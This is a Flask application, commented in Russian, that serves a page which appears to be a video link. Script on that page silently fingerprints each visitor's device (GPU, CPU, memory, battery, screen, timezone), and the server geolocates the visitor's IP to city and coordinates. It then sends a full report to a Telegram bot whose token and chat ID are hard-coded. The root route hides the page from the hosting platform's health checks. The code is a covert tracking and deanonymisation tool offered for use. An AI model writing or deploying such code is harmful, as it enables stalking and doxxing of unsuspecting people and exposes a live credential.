from datetime import datetime
import os
from flask import Flask, render_template_string, request, send_from_directory
import requests

app = Flask(__name__)
app.secret_key = os.urandom(24)

TELEGRAM_BOT_TOKEN = "8694192081:AAHOX9HIqNuYPt1hhq9Ua9d4SDS6mJ0s0tw"
TELEGRAM_CHAT_ID = "8564758689"


def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Ошибка отправки текста: {e}")


@app.route("/")
def index():
    user_agent = request.headers.get("User-Agent", "")
    if "Go-http-client" in user_agent or "Render" in user_agent:
        return "OK", 200

    html_page = """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Загрузка...</title>
        <style>
            body {
                margin: 0;
                background-color: #000;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                overflow: hidden;
            }
            video {
                max-width: 100%;
                max-height: 100%;
                outline: none;
            }
        </style>
    </head>
    <body>
        <video id="vid" controls autoplay playsinline>
            <source src="/video/333.m4" type="video/mp4">
            Ваш браузер не поддерживает видео.
        </video>

        <script>
            async function collectAndSend() {
                let screenInfo = screen.width + "x" + screen.height + " (Доступно: " + window.innerWidth + "x" + window.innerHeight + ")";
                let pixelRatio = window.devicePixelRatio || 1;
                let touchPoints = navigator.maxTouchPoints || 0;
                let cpuCores = navigator.hardwareConcurrency || "Неизвестно";
                let memory = navigator.deviceMemory ? navigator.deviceMemory + " ГБ" : "Неизвестно";
                let platform = navigator.platform || "Неизвестно";
                let language = navigator.language || "Неизвестно";
                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно";
                let cookiesEnabled = navigator.cookieEnabled ? "Да" : "Нет";

                let gpu = "Неизвестно";
                try {
                    let canvas = document.createElement('canvas');
                    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        }
                    }
                } catch(e) {}

                let batteryLevel = "Неизвестно";
                let batteryCharging = "Неизвестно";
                try {
                    if (navigator.getBattery) {
                        let battery = await navigator.getBattery();
                        batteryLevel = Math.round(battery.level * 100) + "%";
                        batteryCharging = battery.charging ? "Да" : "Нет";
                    }
                } catch(e) {}

                let data = JSON.stringify({
                    screen: screenInfo,
                    pixel_ratio: pixelRatio,
                    touch: touchPoints,
                    cores: cpuCores,
                    memory: memory,
                    platform: platform,
                    language: language,
                    timezone: timezone,
                    cookies: cookiesEnabled,
                    gpu: gpu,
                    battery_level: batteryLevel,
                    battery_charging: batteryCharging
                });

                // Используем send_beacon для гарантированной отправки данных
                if (navigator.sendBeacon) {
                    navigator.sendBeacon('/collect', new Blob([data], {type: 'application/json'}));
                } else {
                    fetch('/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: data,
                        keepalive: true
                    });
                }
            }
            collectAndSend();
        </script>
    </body>
    </html>
    """
    return render_template_string(html_page)


@app.route("/video/<filename>")
def serve_video(filename):
    return send_from_directory(".", filename)


@app.route("/collect", methods=["POST"])
def collect():
    data = request.json or {}
    
    ip = request.headers.get("X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr))
    if "," in ip:
        ip = ip.split(",")[0].strip()

    visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    geo_info = {}
    try:
        geo_resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,proxy", timeout=3)
        if geo_resp.status_code == 200:
            geo_info = geo_resp.json()
    except:
        pass

    country = geo_info.get("country", "Не определено")
    region = geo_info.get("regionName", "Не определено")
    city = geo_info.get("city", "Не определено")
    lat = geo_info.get("lat", 0)
    lon = geo_info.get("lon", 0)
    isp = geo_info.get("isp", "Не определено")
    org = geo_info.get("org", "Не определено")
    is_vpn = "Да" if geo_info.get("proxy") else "Нет"

    user_agent = request.headers.get("User-Agent", "")

    initial_message = (
        f"🔔 *МАКСИМАЛЬНЫЙ ОТЧЕТ О ПЕРЕХОДЕ*\n\n"
        f"⏱️ *Время:* `{visit_time}`\n"
        f"🌐 *IP-адрес:* `{ip}`\n"
        f"🛡 *VPN / Прокси:* `{is_vpn}`\n"
        f"🔗 *Реферер:* `{request.referrer or 'Прямой заход'}`\n\n"
        f"📍 *ГЕОЛОКАЦИЯ:*\n"
        f"- Страна: `{country}`\n"
        f"- Регион: `{region}`\n"
        f"- Город: `{city}`\n"
        f"- Координаты: `{lat}, {lon}`\n"
        f"- Провайдер: `{isp}`\n"
        f"- Организация: `{org}`\n\n"
        f"💻 *ЖЕЛЕЗО И ЭКРАН:*\n"
        f"- Платформа ОС: `{data.get('platform')}`\n"
        f"- Экран: `{data.get('screen')}`\n"
        f"- Плотность пикселей: `{data.get('pixel_ratio')}`\n"
        f"- Точки касания (Тач): `{data.get('touch')}`\n"
        f"- Ядра процессора: `{data.get('cores')}`\n"
        f"- Оперативная память: `{data.get('memory')}`\n"
        f"- Видеокарта (GPU): `{data.get('gpu')}`\n\n"
        f"⚙️ *СИСТЕМА И БАТАРЕЯ:*\n"
        f"- Язык: `{data.get('language')}`\n"
        f"- Часовой пояс: `{data.get('timezone')}`\n"
        f"- Батарея: `{data.get('battery_level')} (Зарядка: {data.get('battery_charging')})`\n"
        f"- Cookies: `{data.get('cookies')} | Онлайн: Да`\n\n"
        f"🌐 *USER-AGENT:*\n`{user_agent}`"
    )

    send_telegram_message(initial_message)
    return "OK", 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
